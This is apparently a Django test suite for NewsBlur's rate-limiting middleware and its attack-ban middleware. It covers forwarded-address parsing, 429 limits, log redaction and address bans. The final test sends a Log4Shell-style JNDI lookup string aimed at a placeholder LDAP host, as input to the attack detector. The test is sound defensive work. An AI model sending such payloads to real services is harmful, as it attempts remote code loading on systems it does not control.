"""Counting every request by address and limiting signed-out page loads
(IPRateTrackingMiddleware in apps/profile/middleware.py, RequestRateTracker in utils/ip_rate_tracker.py)."""

import uuid
from unittest.mock import patch

import redis
from django.conf import settings
from django.contrib.auth.models import User
from django.contrib.sites.models import Site
from django.test import RequestFactory, SimpleTestCase, TestCase, override_settings
from django.test.client import Client
from django.urls import reverse

from utils.ip_rate_tracker import AttackDetector, RequestRateTracker, client_address

LIMIT = 3
VISITOR = "203.0.113.7"
ANOTHER_VISITOR = "203.0.113.8"


class Test_ClientAddress(SimpleTestCase):
    """client_address in utils/ip_rate_tracker.py: the load balancer appends the address it saw to
    X-Forwarded-For, after anything the client sent and before any internal proxy."""

    def test_the_address_the_load_balancer_recorded_is_the_one_counted(self):
        headers = {
            "8.8.8.8": "8.8.8.8",
            "198.51.100.3, 8.8.8.8": "8.8.8.8",
            "not-an-address, 8.8.8.8": "8.8.8.8",
            "1.1.1.1, 8.8.8.8": "8.8.8.8",
            "8.8.8.8, 10.0.0.5": "8.8.8.8",
            "8.8.8.8, 100.64.0.7, 127.0.0.1": "8.8.8.8",
            "10.0.0.5": "10.0.0.5",
        }
        for forwarded, expected in headers.items():
            with self.subTest(forwarded=forwarded):
                request = RequestFactory().get("/", HTTP_X_FORWARDED_FOR=forwarded, REMOTE_ADDR="10.0.0.1")
                self.assertEqual(client_address(request), expected)

        self.assertEqual(client_address(RequestFactory().get("/", REMOTE_ADDR="10.0.0.1")), "10.0.0.1")


# The middleware stands aside under TEST_DEBUG, so these classes turn that off to exercise it.
@override_settings(IP_RATE_LIMIT_ANONYMOUS_PER_MINUTE=LIMIT, IP_RATE_LIMITING_ENABLED=True, TEST_DEBUG=False)
class Test_RequestRateLimit(TestCase):
    def setUp(self):
        Site.objects.update_or_create(
            pk=settings.SITE_ID, defaults={"domain": "www.newsblur.com", "name": "NewsBlur"}
        )
        self.addCleanup(Site.objects.clear_cache)
        User.objects.create_user(username="blogger", password="password")
        self.client = Client(HTTP_USER_AGENT="Mozilla/5.0")
        # Counts live in the development Redis, so each test counts in a minute of its own.
        self.minute = "test-%s" % uuid.uuid4().hex
        window = patch.object(RequestRateTracker, "get_current_window", side_effect=lambda: self.minute)
        window.start()
        self.addCleanup(window.stop)

    def _blurblog(self, address=VISITOR, client=None):
        return (client or self.client).get(
            reverse("index"), HTTP_HOST="blogger.newsblur.com", HTTP_X_FORWARDED_FOR=address
        )

    def _front_page(self, address=VISITOR):
        return self.client.get(reverse("index"), HTTP_HOST="www.newsblur.com", HTTP_X_FORWARDED_FOR=address)

    def _statuses(self, request, times):
        return [request().status_code for _ in range(times)]

    # --- signed-out blurblog pages -----------------------------------------

    def test_blurblog_loads_past_the_limit_are_refused(self):
        self.assertEqual(self._statuses(self._blurblog, LIMIT), [200] * LIMIT)

        refused = self._blurblog()

        self.assertEqual(refused.status_code, 429)
        self.assertTrue(1 <= int(refused["Retry-After"]) <= 60, refused["Retry-After"])

    def test_the_next_minute_starts_a_new_count(self):
        self._statuses(self._blurblog, LIMIT + 1)

        self.minute = "test-%s" % uuid.uuid4().hex

        self.assertEqual(self._blurblog().status_code, 200)

    def test_each_address_is_counted_on_its_own(self):
        self._statuses(self._blurblog, LIMIT + 1)

        self.assertEqual(self._blurblog(address=ANOTHER_VISITOR).status_code, 200)

    def test_an_address_the_visitor_supplies_does_not_start_a_new_count(self):
        """The load balancer appends the address it saw, so that entry is the one counted."""
        for attempt in range(LIMIT):
            self._blurblog(address="198.51.100.%s, %s" % (attempt, VISITOR))

        refused = self._blurblog(address="198.51.100.99, %s" % VISITOR)

        self.assertEqual(refused.status_code, 429)

    @override_settings(IP_RATE_LIMITING_ANONYMOUS_ENABLED=True)
    def test_signed_in_readers_are_never_held_to_the_signed_out_limit(self):
        User.objects.create_user(username="reader", password="password")
        reader = Client(HTTP_USER_AGENT="Mozilla/5.0")
        reader.login(username="reader", password="password")

        statuses = self._statuses(lambda: self._blurblog(client=reader), LIMIT + 2)

        self.assertEqual(statuses, [200] * (LIMIT + 2))

    @override_settings(IP_RATE_LIMITING_ENABLED=False)
    def test_the_main_switch_turns_the_limit_off(self):
        self.assertEqual(self._statuses(self._blurblog, LIMIT + 2), [200] * (LIMIT + 2))

    def test_the_page_is_served_when_the_count_cannot_be_kept(self):
        with patch.object(RequestRateTracker, "track", side_effect=redis.ConnectionError("down")):
            self.assertEqual(self._blurblog().status_code, 200)

    def test_a_fault_in_the_counting_is_reported_and_the_page_still_served(self):
        with patch.object(RequestRateTracker, "track", side_effect=TypeError("a bug")):
            with patch("apps.profile.middleware.capture_exception") as report:
                statuses = self._statuses(self._blurblog, 3)

        self.assertEqual(statuses, [200, 200, 200])
        report.assert_called_once()

    # --- every other signed-out request -------------------------------------

    def test_other_signed_out_requests_are_served_past_the_limit(self):
        self.assertEqual(self._statuses(self._front_page, LIMIT + 2), [200] * (LIMIT + 2))

    @override_settings(IP_RATE_LIMITING_ANONYMOUS_ENABLED=True)
    def test_other_signed_out_requests_are_refused_once_their_enforcement_is_on(self):
        self.assertEqual(self._statuses(self._front_page, LIMIT), [200] * LIMIT)

        self.assertEqual(self._front_page().status_code, 429)

    def test_log_lines_for_requests_past_the_limit_leave_out_the_path_and_query(self):
        with patch("apps.profile.middleware.logging.user") as log:
            for _ in range(LIMIT + 1):
                self.client.get(
                    "/profile/email_optout/someone/pathtoken456",
                    {"secret_token": "querytoken123"},
                    HTTP_HOST="www.newsblur.com",
                    HTTP_X_FORWARDED_FOR=VISITOR,
                )

        logged = " ".join(str(call.args[1]) for call in log.call_args_list)
        self.assertIn("WOULD BLOCK", logged)
        self.assertIn("email_optout", logged)
        self.assertNotIn("pathtoken456", logged)
        self.assertNotIn("querytoken123", logged)

    @override_settings(IP_RATE_LIMITING_ANONYMOUS_ENABLED=True)
    def test_health_checks_are_never_counted_or_refused(self):
        statuses = self._statuses(
            lambda: self.client.get("/_haproxychk", HTTP_X_FORWARDED_FOR=VISITOR), LIMIT + 2
        )

        self.assertEqual(statuses, [200] * (LIMIT + 2))
        self.assertEqual(RequestRateTracker().get_counts(VISITOR), {})

    # --- what staff can look up afterwards -----------------------------------

    def test_requests_are_counted_by_address_and_kind(self):
        self._statuses(self._blurblog, 2)
        self._front_page()
        User.objects.create_user(username="reader", password="password")
        reader = Client(HTTP_USER_AGENT="Mozilla/5.0")
        reader.login(username="reader", password="password")
        self._blurblog(address=ANOTHER_VISITOR, client=reader)

        tracker = RequestRateTracker()

        self.assertEqual(tracker.get_counts(VISITOR), {"page": 2, "anonymous": 1})
        self.assertEqual(tracker.get_counts(ANOTHER_VISITOR), {"user": 1})
        self.assertEqual(tracker.get_top_addresses("page"), [(VISITOR, 2)])


@override_settings(TEST_DEBUG=False)
class Test_BannedAddress(TestCase):
    """AttackBanMiddleware in apps/profile/middleware.py bans the address the load balancer recorded."""

    SENDER = "192.0.2.55"
    SUPPLIED = "198.51.100.9"

    def setUp(self):
        Site.objects.update_or_create(
            pk=settings.SITE_ID, defaults={"domain": "www.newsblur.com", "name": "NewsBlur"}
        )
        self.addCleanup(Site.objects.clear_cache)
        self.client = Client(HTTP_USER_AGENT="Mozilla/5.0")
        # Bans live in the development Redis for a day, so take this test's away again.
        keys = [
            "atk:%s:%s" % (kind, address)
            for kind in ("ban", "log")
            for address in (self.SENDER, self.SUPPLIED)
        ]
        self.addCleanup(AttackDetector().redis.delete, *keys)

    def _front_page(self, address, **query):
        return self.client.get(
            reverse("index"), query, HTTP_HOST="www.newsblur.com", HTTP_X_FORWARDED_FOR=address
        )

    def test_a_ban_follows_the_sender_and_not_the_address_it_supplied(self):
        attack = self._front_page("%s, %s" % (self.SUPPLIED, self.SENDER), q="${jndi:ldap://example.test/a}")
        self.assertEqual(attack.status_code, 403)

        self.assertEqual(self._front_page(self.SENDER).status_code, 403)
        self.assertEqual(self._front_page(self.SUPPLIED).status_code, 200)
